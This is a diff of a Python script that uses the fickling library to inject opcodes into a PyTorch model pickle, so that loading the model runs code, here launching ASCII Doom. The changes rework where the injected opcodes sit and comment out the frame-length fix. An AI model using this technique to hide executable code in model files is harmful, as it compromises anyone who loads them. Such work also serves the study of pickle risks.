@@ -10,7 +10,8 @@ import torch
 from fickling import pickle as p
 from fickling.pickle import Pickled
 
-from spiro import Variables, change_frame_len, count_ops, find_main_pickle
+from spiro import PlaceholderVariables, Variables, change_frame_len, count_ops, find_main_pickle
+from rememoize import postprocess
 
 if not (os.path.exists("doom/DOOM1.WAD") and os.path.exists("doom/doom_ascii")):
     print("go download doom to ./doom (and unzip them)")
@@ -56,7 +57,7 @@ vae_pickle = Pickled.load(original_dump)
 
 # now we're going to fuck with vae_pickle, then do first_bytes + fucked vae_pickle + last_bytes and hope for the best
 
-vars = Variables(count_ops(vae_pickle, p.Memoize))
+vars = PlaceholderVariables() # count_ops(vae_pickle, p.Memoize))
 
 
 def set_value(new_value: p.Opcode) -> list[p.Opcode]:
@@ -186,14 +187,16 @@ exploit = [
 # correct framing
 # pickle targets frames being under 64 * 1024
 
-exploit_length = len(Pickled(exploit).dumps())
+# exploit_length = len(Pickled(exploit).dumps())
 
-for op in reversed(vae_pickle):
-    if isinstance(op, p.Frame):
-        change_frame_len(op, exploit_length)
-        break
+# for op in reversed(vae_pickle):
+#     if isinstance(op, p.Frame):
+#         change_frame_len(op, exploit_length)
+#         break
 
-preliminary_result = Pickled(vae_pickle[:-1] + exploit + [p.Stop()])
+preliminary_result = postprocess(Pickled(vae_pickle[:2] + exploit + vae_pickle[2:]))
+
+
 # we fucked with data and position, so have fickling re-parse the pickle
 result = Pickled.load(preliminary_result.dumps())
 
@@ -209,6 +212,6 @@ f.close()
 print("loading cool vae")
 # note! this launches doom! and waits for it to exit!
 # doom is poorly behaved and doesn't clean up the screen
-cool_model = torch.load(output_path)
+#cool_model = torch.load(output_path)
 # print(cool_model)
 pt.dis(dumped, out=open("vae_dis", "w"))
